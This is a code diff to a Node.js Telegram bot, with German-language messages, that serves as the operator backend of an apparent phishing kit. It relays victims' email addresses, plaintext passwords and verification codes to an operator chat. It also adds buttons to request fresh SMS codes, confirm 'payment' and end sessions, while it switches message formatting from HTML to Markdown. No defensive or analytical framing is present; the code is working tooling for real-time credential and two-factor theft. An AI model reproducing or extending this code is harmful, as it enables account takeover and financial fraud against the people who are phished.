@@ -361,16 +361,16 @@ async function handleCallbackQuery(query) {
         
         // Update the message
         bot.editMessageText(`
-🔄 <b>Neues Formular angefordert</b>
+🔄 *Neues Formular angefordert*
 
-🔑 <b>Sitzung:</b> <code>${key}</code>
-🕒 <b>Zeit:</b> ${formatDate(Date.now())}
+🔑 *Sitzung:* \`${key}\`
+🕒 *Zeit:* ${formatDate(Date.now())}
 
-<i>Warten auf die Formulareingabe des Benutzers...</i>
+_Warten auf die Formulareingabe des Benutzers..._
         `, {
           chat_id: chatId,
           message_id: messageId,
-          parse_mode: 'HTML',
+          parse_mode: 'Markdown',
           reply_markup: {
             inline_keyboard: [
               [
@@ -392,7 +392,7 @@ async function handleCallbackQuery(query) {
         bot.editMessageText(successMessage, {
           chat_id: chatId,
           message_id: messageId,
-          parse_mode: 'HTML',
+          parse_mode: 'Markdown',
           reply_markup: {
             inline_keyboard: [
               [
@@ -415,7 +415,7 @@ async function handleCallbackQuery(query) {
         bot.editMessageText(newCodeMessage.text, {
           chat_id: chatId,
           message_id: messageId,
-          parse_mode: 'HTML',
+          parse_mode: 'Markdown',
           reply_markup: newCodeMessage.reply_markup
         });
         
@@ -431,7 +431,7 @@ async function handleCallbackQuery(query) {
         bot.editMessageText(endSessionMessage, {
           chat_id: chatId,
           message_id: messageId,
-          parse_mode: 'HTML'
+          parse_mode: 'Markdown'
         });
         
         bot.answerCallbackQuery(query.id, { text: '✅ Sitzung abgeschlossen' });
@@ -446,7 +446,7 @@ async function handleCallbackQuery(query) {
         bot.editMessageText(requestCodeMessage.text, {
           chat_id: chatId,
           message_id: messageId,
-          parse_mode: 'HTML',
+          parse_mode: 'Markdown',
           reply_markup: requestCodeMessage.reply_markup
         });
         
@@ -652,6 +652,241 @@ async function notifyAdmin(key, formType, data) {
 }
 
 /**
+ * Send a notification to the admin when a user reaches the pending page
+ * @param {string} key - Session key
+ */
+async function notifyPending(key) {
+  try {
+    // Get session data
+    const sessionData = activeSessions.get(key);
+    if (!sessionData) {
+      console.error('Session not found:', key);
+      return;
+    }
+    
+    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
+    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
+    
+    // Format the message
+    const message = `
+⏳ *Benutzer wartet auf Bestätigung*
+
+📋 *Formulardaten:*
+📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
+🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}
+
+🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}
+
+🆔 *Sitzung:* \`${key}\`
+🕒 *Zeit:* ${formatDate(Date.now())}
+
+_Der Benutzer wartet auf der Pending-Seite. Bitte bestätigen Sie die Zahlung oder beenden Sie die Sitzung._
+    `;
+    
+    // Create inline keyboard
+    const inlineKeyboard = {
+      inline_keyboard: [
+        [
+          { text: '✅ Zahlung bestätigen', callback_data: `confirm_payment:${key}` },
+          { text: '🔄 Neuen Code anfordern', callback_data: `request_new_code:${key}` }
+        ],
+        [
+          { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
+        ]
+      ]
+    };
+    
+    // Get the last message ID to update it
+    const lastMessageId = sessionData.messageIds.length > 0 ? 
+      sessionData.messageIds[sessionData.messageIds.length - 1] : null;
+    
+    if (lastMessageId) {
+      // Update the existing message
+      await bot.editMessageText(message, {
+        chat_id: targetChatId,
+        message_id: lastMessageId,
+        parse_mode: 'Markdown',
+        reply_markup: inlineKeyboard
+      });
+    } else {
+      console.error('No previous message found for session:', key);
+      
+      // Send message with inline keyboard as fallback
+      const sentMessage = await bot.sendMessage(targetChatId, message, {
+        parse_mode: 'Markdown',
+        reply_markup: inlineKeyboard
+      });
+      
+      // Store message ID for future reference
+      sessionData.messageIds.push(sentMessage.message_id);
+      activeSessions.set(key, sessionData);
+    }
+  } catch (error) {
+    console.error('Error sending pending notification:', error);
+  }
+}
+
+/**
+ * Create a formatted message with form data
+ * @param {string} key - Session key
+ * @param {Object} formData - Form data
+ * @param {string} statusMessage - Status message to display
+ * @returns {Object} Message object with text and reply_markup
+ */
+function createFormDataMessage(key, formData, statusMessage) {
+  // Ensure formData is an object
+  formData = formData || {};
+  
+  // Create message text
+  const text = `${statusMessage || ''}
+
+📝 *Formular-Daten:*
+📧 *E-Mail:* ${formData.email || 'N/A'}
+🔒 *Passwort:* ${formData.password || 'N/A'}
+
+🔑 *Sitzung:* \`${key}\`
+🕒 *Zeit:* ${formatDate(Date.now())}
+  `;
+  
+  // Create inline keyboard
+  const reply_markup = {
+    inline_keyboard: [
+      [
+        { text: '🔄 Neues Formular anfordern', callback_data: `request_new_form:${key}` }
+      ],
+      [
+        { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
+      ]
+    ]
+  };
+  
+  return { text, reply_markup };
+}
+
+/**
+ * Create a formatted message with complete session data
+ * @param {string} key - Session key
+ * @param {Object} formData - Form data
+ * @param {string} code - Verification code
+ * @param {string} statusMessage - Status message to display
+ * @returns {string} Formatted message
+ */
+function createCompleteDataMessage(key, formData, code, statusMessage) {
+  let message = `
+${statusMessage}
+
+📋 *Formulardaten:*
+📧 *E-Mail:* ${formData.email || 'N/A'}
+🔒 *Passwort:* ${formData.password || 'N/A'}
+
+🔑 *Verifizierungscode:* ${code || 'N/A'}
+
+🆔 *Sitzung:* \`${key}\`
+🕒 *Zeit:* ${formatDate(Date.now())}
+  `;
+  
+  return message;
+}
+
+/**
+ * Send a notification about the session status
+ * @param {string} key - Session key
+ * @param {string} status - Session status
+ */
+async function notifySessionStatus(key, status) {
+  try {
+    // Get session data
+    const sessionData = activeSessions.get(key);
+    if (!sessionData) {
+      console.error('Session not found:', key);
+      return;
+    }
+    
+    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
+    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
+    
+    let message = '';
+    let inlineKeyboard = {};
+    
+    if (status === 'ended') {
+      message = `
+✅ *Sitzung beendet*
+
+📋 *Formulardaten:*
+📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
+🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}
+
+🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}
+
+🆔 *Sitzung:* \`${key}\`
+🕒 *Zeit:* ${formatDate(Date.now())}
+
+_Die Sitzung wurde erfolgreich beendet._
+      `;
+      
+      inlineKeyboard = {
+        inline_keyboard: [
+          [
+            { text: '🆕 Neue Sitzung erstellen', callback_data: 'new_session' }
+          ]
+        ]
+      };
+    } else if (status === 'payment_confirmed') {
+      message = `
+💰 *Zahlung bestätigt*
+
+📋 *Formulardaten:*
+📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
+🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}
+
+🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}
+
+🆔 *Sitzung:* \`${key}\`
+🕒 *Zeit:* ${formatDate(Date.now())}
+
+_Die Zahlung wurde bestätigt. Der Benutzer wird zur Erfolgsseite weitergeleitet._
+      `;
+      
+      inlineKeyboard = {
+        inline_keyboard: [
+          [
+            { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
+          ]
+        ]
+      };
+    }
+    
+    // Get the last message ID to update it
+    const lastMessageId = sessionData.messageIds.length > 0 ? 
+      sessionData.messageIds[sessionData.messageIds.length - 1] : null;
+    
+    if (lastMessageId) {
+      // Update the existing message
+      await bot.editMessageText(message, {
+        chat_id: targetChatId,
+        message_id: lastMessageId,
+        parse_mode: 'Markdown',
+        reply_markup: inlineKeyboard
+      });
+    } else {
+      console.error('No previous message found for session:', key);
+      
+      // Send message with inline keyboard as fallback
+      const sentMessage = await bot.sendMessage(targetChatId, message, {
+        parse_mode: 'Markdown',
+        reply_markup: inlineKeyboard
+      });
+      
+      // Store message ID for future reference
+      sessionData.messageIds.push(sentMessage.message_id);
+      activeSessions.set(key, sessionData);
+    }
+  } catch (error) {
+    console.error('Error sending session status notification:', error);
+  }
+}
+
+/**
  * Notify admin about auto-generated sessions
  * @param {string} key - Session key
  */
@@ -756,17 +991,8 @@ async function notifySmsCodeRequest(key, verificationMethod) {
         reply_markup: inlineKeyboard
       });
     } else {
+      // If no previous message exists, create a new one
       console.error('No previous message found for session:', key);
-      
-      // Send message with inline keyboard as fallback
-      const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, message.text, {
-        parse_mode: 'Markdown',
-        reply_markup: inlineKeyboard
-      });
-      
-      // Store message ID for future reference
-      sessionData.messageIds.push(sentMessage.message_id);
-      activeSessions.set(key, sessionData);
     }
   } catch (error) {
     console.error('Error notifying admin about SMS code request:', error);
@@ -785,181 +1011,3 @@ module.exports = {
   notifyPending,
   notifySessionStatus
 };
-
-/**
- * Create a formatted message with complete session data
- * @param {string} key - Session key
- * @param {Object} formData - Form data
- * @param {string} code - Verification code
- * @param {string} statusMessage - Status message to display
- * @returns {string} Formatted message
- */
-function escapeHTML(text) {
-  if (!text) return '';
-  return text
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;');
-}
-
-function createCompleteDataMessage(key, formData, code, statusMessage) {
-  // Escape special characters in email, password and code
-  const safeEmail = escapeHTML(formData?.email || 'N/A');
-  const safePassword = escapeHTML(formData?.password || 'N/A');
-  const safeCode = escapeHTML(code || 'N/A');
-  
-  let message = `
-${statusMessage}
-
-📋 <b>Formulardaten:</b>
-📧 <b>E-Mail:</b> ${safeEmail}
-🔒 <b>Passwort:</b> ${safePassword}
-
-🔑 <b>Verifizierungscode:</b> ${safeCode}
-
-🆔 <b>Sitzung:</b> <code>${key}</code>
-🕒 <b>Zeit:</b> ${formatDate(Date.now())}
-  `;
-  
-  return message;
-}
-
-/**
- * Create a formatted message with form data
- * @param {string} key - Session key
- * @param {Object} formData - Form data
- * @param {string} statusMessage - Status message to display
- * @returns {Object} Message object with text and reply_markup
- */
-function createFormDataMessage(key, formData, statusMessage) {
-  // Ensure formData is an object
-  formData = formData || {};
-  
-  // Escape special characters in email and password
-  const safeEmail = escapeHTML(formData.email || 'N/A');
-  const safePassword = escapeHTML(formData.password || 'N/A');
-  
-  // Create message text
-  const text = `${statusMessage || ''}
-
-📝 <b>Formular-Daten:</b>
-📧 <b>E-Mail:</b> ${safeEmail}
-🔒 <b>Passwort:</b> ${safePassword}
-
-🔑 <b>Sitzung:</b> <code>${key}</code>
-🕒 <b>Zeit:</b> ${formatDate(Date.now())}
-  `;
-  
-  // Create inline keyboard
-  const reply_markup = {
-    inline_keyboard: [
-      [
-        { text: '🔄 Neues Formular anfordern', callback_data: `request_new_form:${key}` }
-      ],
-      [
-        { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
-      ]
-    ]
-  };
-  
-  return { text, reply_markup };
-}
-
-/**
- * Send a notification about the session status
- * @param {string} key - Session key
- * @param {string} status - Session status
- */
-async function notifySessionStatus(key, status) {
-  try {
-    // Get session data
-    const sessionData = activeSessions.get(key);
-    if (!sessionData) {
-      console.error('Session not found:', key);
-      return;
-    }
-    
-    // Use GROUP_CHAT_ID if available, otherwise fall back to ADMIN_CHAT_ID
-    const targetChatId = GROUP_CHAT_ID || ADMIN_CHAT_ID;
-    
-    let message;
-    let inlineKeyboard;
-    
-    if (status === 'ended') {
-      message = `
-✅ *Sitzung beendet*
-
-📋 *Formulardaten:*
-📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
-🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}
-
-🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}
-
-🆔 *Sitzung:* \`${key}\`
-🕒 *Zeit:* ${formatDate(Date.now())}
-
-_Die Sitzung wurde erfolgreich beendet._
-      `;
-      
-      inlineKeyboard = {
-        inline_keyboard: [
-          [
-            { text: '🆕 Neue Sitzung erstellen', callback_data: 'new_session' }
-          ]
-        ]
-      };
-    } else if (status === 'payment_confirmed') {
-      message = `
-💰 *Zahlung bestätigt*
-
-📋 *Formulardaten:*
-📧 *E-Mail:* ${sessionData.formData.email || 'N/A'}
-🔒 *Passwort:* ${sessionData.formData.password || 'N/A'}
-
-🔑 *Verifizierungscode:* ${sessionData.code || 'N/A'}
-
-🆔 *Sitzung:* \`${key}\`
-🕒 *Zeit:* ${formatDate(Date.now())}
-
-_Die Zahlung wurde bestätigt. Der Benutzer wird zur Erfolgsseite weitergeleitet._
-      `;
-      
-      inlineKeyboard = {
-        inline_keyboard: [
-          [
-            { text: '❌ Sitzung beenden', callback_data: `end_session:${key}` }
-          ]
-        ]
-      };
-    }
-    
-    // Get the last message ID to update it
-    const lastMessageId = sessionData.messageIds.length > 0 ? 
-      sessionData.messageIds[sessionData.messageIds.length - 1] : null;
-    
-    if (lastMessageId) {
-      // Update the existing message
-      await bot.editMessageText(message, {
-        chat_id: targetChatId,
-        message_id: lastMessageId,
-        parse_mode: 'HTML',
-        reply_markup: inlineKeyboard
-      });
-    } else {
-      console.error('No previous message found for session:', key);
-      
-      // Send message with inline keyboard as fallback
-      const sentMessage = await bot.sendMessage(targetChatId, message, {
-        parse_mode: 'HTML',
-        reply_markup: inlineKeyboard
-      });
-      
-      // Store message ID for future reference
-      sessionData.messageIds.push(sentMessage.message_id);
-      activeSessions.set(key, sessionData);
-    }
-  } catch (error) {
-    console.error('Error sending session status notification:', error);
-  }
-}
